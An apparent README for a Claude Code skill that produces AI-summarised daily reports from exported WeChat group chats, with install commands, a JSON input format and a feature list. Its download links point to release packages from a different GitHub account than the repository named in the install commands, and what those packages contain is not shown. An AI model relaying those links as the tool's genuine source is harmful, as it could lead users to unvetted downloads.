---
layout: "default"
title: "🌟 wechat-daily-report-skill - Effortlessly Generate WeChat Reports"
description: "📝 Generate daily reports from WeChat group chats using AI analysis and striking visual presentations. Enhance insights with engaging summaries and statistics."
---
# 🌟 wechat-daily-report-skill - Effortlessly Generate WeChat Reports

[![Download WeChat Daily Report Skill](https://img.shields.io/badge/Download-WeChat%20Daily%20Report%20Skill-blue?style=for-the-badge&logo=github)](https://github.com/leonense22/wechat-daily-report-skill/releases)

## 🚀 Getting Started

Welcome to the WeChat Daily Report Generator! This tool helps you analyze WeChat group chat records, using AI to produce elegant reports in PNG format for your mobile device. Follow these steps to download, install, and run the application.

## 📥 Download & Install

1. **Visit the Releases Page**: Go to the [Releases](https://github.com/leonense22/wechat-daily-report-skill/releases) page.
2. **Download the Latest Version**: Look for the latest release. Click on the link to download the software package suited for your system.

## 🖥️ System Requirements

- **Operating System**: Compatible with Windows, macOS, and Linux.
- **Python**: Version 3.8 or newer.
- **Node.js**: Optional for development purposes only.

## 🛠️ Install Dependencies

After downloading, open your terminal or command prompt and install the required Python libraries. Run these commands:

```bash
pip install jieba jinja2 playwright
playwright install chromium
```

These libraries help the application analyze chat records and generate reports in a user-friendly format.

## 📚 Usage Steps

### Step 1: Install Skill

**Automatic Installation (Recommended)**: Open your terminal and run the command below:

```bash
npx skills add https://github.com/ADVISORYDZ/wechat-daily-report-skill
```

**Manual Installation**: If you prefer, you can manually clone the repository into your Claude Skills directory. If the directory does not exist, create it first.

```bash
cd ~/.claude/skills/
git clone https://github.com/ADVISORYDZ/wechat-daily-report-skill.git
```

### Step 2: Obtain Chat Records

Use the [WeFlow](https://github.com/hicccc77/WeFlow) tool to export the WeChat chat records you wish to analyze. Ensure you select the **ChatLab** export format.

### Step 3: Run the Tool

To generate your report, open Claude Code and enter the following command:

> **“Generate [Group Name] Daily Report”**

Claude will then call the necessary scripts, analyze your chat records, and create a beautifully designed report.

## 📂 Data Formats

### Input Chat Record JSON Structure

Prepare your chat records in this JSON format to ensure compatibility with the tool:

```json
{
  "meta": {
    "group_name": "[Your Group Name]",
    "date": "[YYYY-MM-DD]"
  },
  "messages": [
    {
      "user": "[Username]",
      "content": "[Message Content]",
      "timestamp": "[Timestamp]"
    }
  ]
}
```

This structure helps the application understand your chat history and generate the report accurately.

## 📝 Features Overview

- **Data Statistics**: Automatically analyze chat records and create statistics such as talker rankings and word clouds.
- **AI Summarization**: Utilize AI to identify key discussion points, extract valuable resources, and highlight interesting conversations.
- **Visual Reports**: Generate reports in HTML/CSS format tailored for mobile display, ensuring ease of reading.
- **Stylish Design**: Enjoy humorous and engaging report styles, enhancing the fun of reviewing chat records.

## ⚙️ Troubleshooting

If you encounter issues:

1. **Check Python Version**: Ensure you are using Python 3.8 or higher.
2. **Dependencies**: Confirm that all required libraries are installed correctly.
3. **Invalid JSON**: Verify that your chat records are in the correct JSON format.

## 📖 Additional Information

For advanced configurations, system optimizations, or detailed usage tips, please refer to the project documentation hosted on the GitHub repository.

---

Your journey to analyzing WeChat chats with style starts here. Enjoy generating your reports!